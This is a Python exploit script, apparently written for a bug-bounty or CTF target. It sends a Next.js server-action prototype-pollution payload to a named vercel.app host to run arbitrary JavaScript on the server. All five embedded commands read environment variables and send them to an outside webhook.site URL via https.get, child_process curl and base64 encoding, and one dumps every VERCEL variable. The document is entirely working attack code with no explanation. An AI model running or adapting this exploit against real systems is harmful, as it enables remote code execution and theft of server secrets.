#!/usr/bin/env python3
"""
Try the original __proto__ prototype pollution method
This is the method that successfully bypassed protections in CTFs
"""

import requests
import json
import random
import string
import time

TARGET = "https://nextjs-cve-hackerone.vercel.app"
ACTION_ID = "007138e0bfbdd7fe024391a1251fd5861f0b5145dc"
WEBHOOK = "https://webhook.site/f794cbb8-6c39-49cc-987a-a141d67c244a"

def try_proto_method(command, label):
    print(f"\n[*] {label}: {command}")

    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    # Original lachlan2k / maple3142 payload structure
    payload_0 = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": f"{command};",
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }

    body = f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="0"\r\n\r\n'
    body += json.dumps(payload_0) + '\r\n'
    body += f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="1"\r\n\r\n'
    body += '"$@0"\r\n'
    body += f'------{boundary}--\r\n'

    headers = {
        'Next-Action': ACTION_ID,
        'Content-Type': f'multipart/form-data; boundary=----{boundary}',
        'Accept': 'text/x-component',
    }

    response = requests.post(TARGET, data=body, headers=headers, timeout=15)
    print(f"    Status: {response.status_code}")
    print(f"    Response: {response.text[:200]}")
    return response

print("="*70)
print("Prototype Pollution Method (__proto__)")
print("="*70)

# Test 1: Direct env access via HTTP request
cmd1 = f"""
const https=require('https');
https.get('{WEBHOOK}?test1=' + encodeURIComponent(process.env.VERCEL_PLATFORM_PROTECTION || 'none'))
"""
try_proto_method(cmd1, "HTTPS GET with env var")
time.sleep(2)

# Test 2: Child process with curl
cmd2 = f"""
require('child_process').exec('curl "{WEBHOOK}?flag=$(printenv VERCEL_PLATFORM_PROTECTION)"')
"""
try_proto_method(cmd2, "curl with env var")
time.sleep(2)

# Test 3: Write to temp file and curl
cmd3 = f"""
const fs=require('fs');
fs.writeFileSync('/tmp/flag.txt', process.env.VERCEL_PLATFORM_PROTECTION || 'none');
require('child_process').exec('curl -X POST "{WEBHOOK}" --data-binary @/tmp/flag.txt')
"""
try_proto_method(cmd3, "Write file then curl")
time.sleep(2)

# Test 4: Base64 encode and send
cmd4 = f"""
const b64 = Buffer.from(process.env.VERCEL_PLATFORM_PROTECTION || 'none').toString('base64');
require('https').get('{WEBHOOK}?b64=' + b64)
"""
try_proto_method(cmd4, "Base64 encoded")
time.sleep(2)

# Test 5: Just dump all VERCEL env vars
cmd5 = f"""
const v = Object.keys(process.env).filter(k=>k.includes('VERCEL')).map(k=>k+'='+process.env[k]).join('&');
require('https').get('{WEBHOOK}?' + v)
"""
try_proto_method(cmd5, "All VERCEL vars")

print(f"\n[*] Check webhook: {WEBHOOK}")
print("="*70)
